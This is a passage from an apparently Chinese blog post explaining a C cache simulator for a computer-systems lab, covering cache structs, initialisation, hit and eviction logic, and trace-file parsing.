    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-s: number of set index(2^s sets)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-E: number of lines per set\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-b: number of block offset bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-t: trace file name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<a id="more"></a>
<p>参考书中对cache的描述，需要些用结构体定义出cache的一些属性</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> s<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2^s sets</span>
    <span class="token keyword">int</span> S<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//S=2^s</span>
    <span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2^b per block    </span>
    <span class="token keyword">int</span> B<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//B=2^b</span>
    <span class="token keyword">int</span> E<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//number of lines per set</span>
    <span class="token comment" spellcheck="true">//number to track the solution    </span>
    <span class="token keyword">int</span> hitNum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> missNum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> evictionNum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> verbosity<span class="token punctuation">;</span>
<span class="token punctuation">}</span> cacheProperty<span class="token punctuation">;</span>
</code></pre>
<p>对应的说明可以看书中 Figure 6.28.</p>
<p>根据Figure 6.27，cache是一个set的数组，每个set包含一个或者多个行，每个行又包括一个有效位，tag标识位， 数据块。所以可以定义出cache的组成</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> tag<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>block<span class="token punctuation">;</span>
    <span class="token keyword">int</span> usedCounter<span class="token punctuation">;</span>
<span class="token punctuation">}</span> setLine<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    setLine <span class="token operator">*</span>lines<span class="token punctuation">;</span>
<span class="token punctuation">}</span> cacheSet<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    cacheSet <span class="token operator">*</span>sets<span class="token punctuation">;</span>
<span class="token punctuation">}</span> cache<span class="token punctuation">;</span>
</code></pre>
<p>接着就需要考虑cache的初始化。其实就是使用malloc分配内存给定义的cache。一开始所有的有效位和tag标识位都为0。</p>
<pre class=" language-c"><code class="language-c">cache <span class="token function">initiate</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> S<span class="token punctuation">,</span> <span class="token keyword">int</span> E<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    cache currentCache<span class="token punctuation">;</span>    
    cacheSet set<span class="token punctuation">;</span>
    setLine line<span class="token punctuation">;</span>
    currentCache<span class="token punctuation">.</span>sets <span class="token operator">=</span> <span class="token punctuation">(</span>cacheSet <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cacheSet<span class="token punctuation">)</span> <span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//loop to construct the set of the cache</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        set<span class="token punctuation">.</span>lines <span class="token operator">=</span>  <span class="token punctuation">(</span>setLine <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>setLine<span class="token punctuation">)</span> <span class="token operator">*</span> E<span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> set<span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//loop to construct the lines</span>
        <span class="token keyword">int</span> j<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">{</span>
            line<span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
            line<span class="token punctuation">.</span>tag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
            set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">;</span>
            line<span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span> currentCache<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>对于判断是否命中，要判断两个部分，有效位是否设置，cache的line中tag标识位是否匹配。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">checkHit</span><span class="token punctuation">(</span>setLine line<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> tag<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>valid<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>tag <span class="token operator">==</span> tag<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>判断行里是否已经满了。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">checkFull</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>property<span class="token punctuation">.</span>E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当需要缓存时，需要找到一个有效的缓存空间。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">findIndex</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>property<span class="token punctuation">.</span>E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//shouldn't get a -1 anyway, method only called when there is granted space</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当缓存不用了，需要移出这块缓存里的内容。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">findEvict</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> min <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> property<span class="token punctuation">.</span>E <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>min<span class="token operator">></span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">)</span><span class="token punctuation">{</span>
            index <span class="token operator">=</span> i<span class="token punctuation">;</span>
            min <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> index<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">findMax</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> max <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> property<span class="token punctuation">.</span>E <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">></span>max<span class="token punctuation">)</span><span class="token punctuation">{</span>
            index <span class="token operator">=</span> i<span class="token punctuation">;</span>
            max <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> index<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>接下来最关键的是写一个模拟器，模拟cache操作。首先，按照书中的介绍，tag的数量在64位系统下等于64减去块偏移位数量和组索引位数量。根据tag数量，可以求出组索引。接着将这块cache记录到Cache区中。通过循环遍历一块cache块里的行，查看命中情况。</p>
<p>如果命中，更新cache的属性。如果不命中，并且缓存并没满，那么需要添加新的缓存内容。如果因为缓存满了，那么需要将缓存中最先使用的缓存块移除缓存。</p>
<pre class=" language-c"><code class="language-c">cacheProperty <span class="token function">simulate</span><span class="token punctuation">(</span>cache currentCache<span class="token punctuation">,</span>cacheProperty property<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> address<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//compute the size of the tag, 64 bit system</span>
    <span class="token keyword">int</span> tagSize <span class="token operator">=</span> <span class="token number">64</span><span class="token operator">-</span><span class="token punctuation">(</span>property<span class="token punctuation">.</span>b <span class="token operator">+</span> property<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>property<span class="token punctuation">.</span>s <span class="token operator">+</span> property<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//use the tagSize to compute for the set index</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> temp <span class="token operator">=</span> address <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>tagSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> setIndex <span class="token operator">=</span> temp <span class="token operator">>></span> <span class="token punctuation">(</span>tagSize <span class="token operator">+</span> property<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    cacheSet set <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//loop through lines in the set</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> hit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>property<span class="token punctuation">.</span>E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        setLine currentLine <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//check if there is a hit</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkHit</span><span class="token punctuation">(</span>currentLine<span class="token punctuation">,</span> tag<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">//if hit, update the staffs in the property</span>
            property<span class="token punctuation">.</span>hitNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            hit <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            max <span class="token operator">=</span> <span class="token function">findMax</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
            currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>hit <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkFull</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//if not full then it is a miss, update the staffs in the property&amp;set</span>
        property<span class="token punctuation">.</span>missNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        index <span class="token operator">=</span> <span class="token function">findIndex</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>
        set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        max <span class="token operator">=</span> <span class="token function">findMax</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>hit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">//evict, update the staffs in the property&amp;set</span>
        property<span class="token punctuation">.</span>missNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        property<span class="token punctuation">.</span>evictionNum<span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> evictIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//find the evict line</span>
        evictIndex <span class="token operator">=</span> <span class="token function">findEvict</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>evictIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>tag <span class="token operator">=</span> tag<span class="token punctuation">;</span>
        <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        max <span class="token operator">=</span> <span class="token function">findMax</span><span class="token punctuation">(</span>set<span class="token punctuation">,</span> property<span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>evictIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>setIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>lines<span class="token punctuation">[</span>max<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> property<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当然最后需要些一个主函数来调用测试接口。这里关于trace文件。每一条对内存访问的记录格式是 [空格]操作符 地址,大小，以 I 开头的是载入指令的记录，不算在内存访问中。</p>
<ul>
<li>M 表示数据修改，需要一次载入 + 一次存储，也就是相当于两次访问</li>
<li>S 表示数据存储</li>
<li>L 表示数据载入</li>
<li>地址指的是一个 64 位的 16 进制内存地址</li>
<li>大小表示该操作内存访问的字节数</li>
</ul>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    cache currentCache<span class="token punctuation">;</span>
    cacheProperty property<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//initiate the char to store the trace</span>
    <span class="token keyword">char</span><span class="token operator">*</span> trace<span class="token punctuation">;</span>
    <span class="token keyword">char</span> input<span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>verbosity <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//parse input</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>input<span class="token operator">=</span><span class="token function">getopt</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span>argv<span class="token punctuation">,</span><span class="token string">"s:E:b:t:vh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">switch</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token string">'s'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'E'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>E <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'b'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>optarg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'t'</span><span class="token punctuation">:</span>
            trace <span class="token operator">=</span> optarg<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string">'v'</span><span class="token punctuation">:</span>
            property<span class="token punctuation">.</span>verbosity <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//help</span>
        <span class="token keyword">case</span> <span class="token string">'h'</span><span class="token punctuation">:</span>
            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//compute S and B</span>
    property<span class="token punctuation">.</span>S <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span>property<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>B <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2.0</span><span class="token punctuation">,</span>property<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//initialize the cache</span>
    currentCache <span class="token operator">=</span> <span class="token function">initiate</span><span class="token punctuation">(</span>property<span class="token punctuation">.</span>S<span class="token punctuation">,</span> property<span class="token punctuation">.</span>E<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//initialize the counters</span>
    property<span class="token punctuation">.</span>missNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>hitNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    property<span class="token punctuation">.</span>evictionNum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//input file</span>
    FILE <span class="token operator">*</span>tmp<span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//wrap the trace into tmp</span>
    <span class="token keyword">char</span> command<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> address<span class="token punctuation">;</span>
    <span class="token keyword">int</span> size<span class="token punctuation">;</span>
    tmp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>trace<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fscanf</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">" %c %llx,%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>command<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">switch</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">//just ignore I</span>
            <span class="token keyword">case</span> <span class="token string">'I'</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">'L'</span><span class="token punctuation">:</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">'S'</span><span class="token punctuation">:</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token comment" spellcheck="true">//twice for M</span>
            <span class="token keyword">case</span> <span class="token string">'M'</span><span class="token punctuation">:</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>
                property <span class="token operator">=</span> <span class="token function">simulate</span><span class="token punctuation">(</span>currentCache<span class="token punctuation">,</span> property<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>    
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//print result</span>
    <span class="token function">printSummary</span><span class="token punctuation">(</span>property<span class="token punctuation">.</span>hitNum<span class="token punctuation">,</span> property<span class="token punctuation">.</span>missNum<span class="token punctuation">,</span> property<span class="token punctuation">.</span>evictionNum<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
